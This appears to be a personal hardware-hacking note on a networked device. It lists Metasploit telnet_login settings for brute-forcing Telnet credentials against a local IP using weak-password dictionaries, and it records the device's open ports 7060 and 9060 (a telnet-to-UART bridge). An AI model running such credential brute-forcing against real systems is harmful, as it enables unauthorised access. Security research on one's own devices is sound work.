# note

## Telnet user and password crack

### Metasploit

[metasplot for archlinuxarm](https://gitee.com/yjun123/alarm-pkgbuilds/tree/master/metasploit)

- start metasploit 

execute `msfconsole`

- user telnet auxiliary 

type `use auxiliary/scanner/telnet/telnet_login`

- get user/pass dictionary

[TgeaUs/Weak-password[(https://github.com/TgeaUs/Weak-password)

- set option

```
set rhosts 192.168.10.123 # set target host
set user_file 常用 # set username dictionary
set pass_file 常用 # set password dictionary
set stop_on_success true
set THREADS 4 # set thread to crack
```
- start exploit

execute `run/exploit`

### Hack firmware



## Other open ports

- 7060

  - comminication port to App

  ![image-20210810114123816](image/taobao-comment-1.png)
  
  
  
  <img src="image/夜视保-screenshot.png" alt="夜视保截图" style="zoom:80%;" />
  
  
  
  - protocol
  
  ![image-20210810112532198](image/port-7060-protocol-boundary-start.png)
  
  ​								

<center>BoundaryS(tart)</center>

![image-20210810112944352](image/port-7060-protocol-boundary-end.png)

<center>BoundaryE(nd)</center>

​									tips: binary data `port-7060-data.bin` is in `/bin`

- 9060

  ​	wireless to UART port

  ![image-20210810113549866](image/port-9060-telnet.png)

<center>telnet 9060</center>

![image-20210810113648774](image/port-9060-minicom-uart.png)

<center>minicom UART</center>

​							
